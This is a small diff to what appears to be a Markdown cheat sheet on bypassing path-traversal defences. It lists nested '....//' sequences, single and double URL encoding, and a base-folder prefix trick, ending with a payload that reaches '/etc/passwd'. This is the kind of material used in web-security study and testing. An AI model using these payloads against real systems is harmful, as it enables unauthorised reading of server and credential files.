@@ -9,7 +9,7 @@
 ## Bypass defences
 - elimination (strip):  `../ ` -> `....// `
   - Test: try to change the orginal request `GET /image?filename=1.jpg` to `GET /image?filename=../1.jpg`
-  - If the file is loaded the code strip ../
+  - If the file is loaded the code strip `../`
 - encode: ` %2e%2e%2f `
 - double-encode: ` %252e%252e%252f `
 - require to start with the expected base folder es. `/var/www/images` -> `filename=/var/www/images/../../../etc/passwd`
